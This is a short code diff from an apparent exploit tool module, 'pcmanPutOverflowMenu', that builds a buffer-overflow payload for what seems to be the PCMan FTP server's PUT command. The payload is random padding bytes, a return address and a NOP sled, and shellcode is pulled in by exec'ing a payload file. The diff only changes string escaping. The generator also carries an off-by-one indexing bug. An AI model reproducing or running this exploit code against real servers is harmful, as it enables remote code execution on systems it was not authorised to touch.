@@ -77,9 +77,9 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 2017):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += "\x77\xc3\x54\x59"
-    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+      payload += "\\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+    payload += "\\x77\\xc3\\x54\\x59"
+    payload += "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
     exec(open("../../../payloads/pcman_put.shell", "r").read())
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
